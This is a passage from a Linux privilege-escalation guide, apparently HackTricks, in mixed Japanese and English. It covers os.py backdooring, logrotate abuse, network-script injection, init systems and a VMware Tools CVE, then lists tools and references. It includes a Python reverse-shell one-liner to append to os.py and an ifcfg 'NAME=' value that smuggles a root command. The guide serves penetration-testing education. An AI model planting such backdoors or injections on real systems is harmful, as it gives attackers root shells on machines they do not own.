If you know from **where** a python script is going to be executed and you **can write inside** that folder or you can **modify python libraries**, you can modify the OS library and backdoor it (if you can write where python script is going to be executed, copy and paste the os.py library).

ライブラリを **backdoor the library** するには、os.py ライブラリの末尾に次の行を追加してください（IP と PORT を変更してください）:
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate の悪用

`logrotate` の脆弱性により、ログファイルやその親ディレクトリに対して **書き込み権限** を持つユーザが権限昇格を行える可能性があります。これは、`logrotate` が多くの場合 **root** として動作しており、特に _**/etc/bash_completion.d/**_ のようなディレクトリ内で任意のファイルを実行するよう操作され得るためです。権限は _/var/log_ だけでなく、ログローテーションが適用されるすべてのディレクトリで確認することが重要です。

> [!TIP]
> この脆弱性は `logrotate` バージョン `3.18.0` 以前に影響します

この脆弱性の詳細は次のページを参照してください: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

この脆弱性は [**logrotten**](https://github.com/whotwagner/logrotten) を使って悪用できます。

この脆弱性は [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** と非常に似ています。したがって、ログを変更できることが判明した場合は、誰がそれらのログを管理しているかを確認し、ログをシンボリックリンクに置き換えて権限を昇格できないか確認してください。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

If, for whatever reason, a user is able to **write** an `ifcf-<whatever>` script to _/etc/sysconfig/network-scripts_ **or** it can **adjust** an existing one, then your **system is pwned**.

Network scripts, _ifcg-eth0_ for example are used for network connections. They look exactly like .INI files. However, they are \~sourced\~ on Linux by Network Manager (dispatcher.d).

In my case, the `NAME=` attributed in these network scripts is not handled correctly. If you have **white/blank space in the name the system tries to execute the part after the white/blank space**. This means that **everything after the first blank space is executed as root**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network と /bin/id の間に空白があることに注意_)

### **init, init.d, systemd, and rc.d**

ディレクトリ `/etc/init.d` は System V init (SysVinit) 用の **scripts**（スクリプト）の格納場所です。これは **古典的な Linux のサービス管理システム** で、`start`、`stop`、`restart`、場合によっては `reload` といったサービス操作用のスクリプトを含みます。これらは直接実行するか、`/etc/rc?.d/` にあるシンボリックリンク経由で実行できます。Redhat 系では代替パスとして `/etc/rc.d/init.d` が使われます。

一方、`/etc/init` は **Upstart** に関連しており、Ubuntu が導入した新しい **service management** で、サービス管理タスクのための設定ファイルを使用します。Upstart への移行後も、互換レイヤーのために SysVinit スクリプトが Upstart 設定と並行して利用されることがあります。

**systemd** は、オンデマンドのデーモン起動、automount 管理、システム状態のスナップショットなどの高度な機能を提供するモダンな初期化およびサービスマネージャとして登場しました。配布パッケージ用に `/usr/lib/systemd/`、管理者による変更用に `/etc/systemd/system/` といったディレクトリ構成でファイルを整理し、システム管理を簡素化します。

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks は一般的に syscall をフックして、特権付きカーネル機能を userspace の manager に露出させます。FD-order に基づく署名チェックや弱いパスワード方式のような manager の認証が脆弱だと、ローカルアプリが manager を偽装して、すでに root 化されたデバイスで root に昇格できる場合があります。詳細とエクスプロイト手順は以下を参照してください：


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations の regex 駆動型 service discovery は、プロセスのコマンドラインからバイナリパスを抽出し、特権コンテキストで -v を付けて実行することがあります。寛容なパターン（例: \S の使用）は、書き込み可能な場所（例: /tmp/httpd）に配置された攻撃者のリスナーにマッチし、root として実行される（CWE-426 Untrusted Search Path）可能性があります。

詳細と他の discovery/monitoring スタックにも適用できる一般化されたパターンはこちら：

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
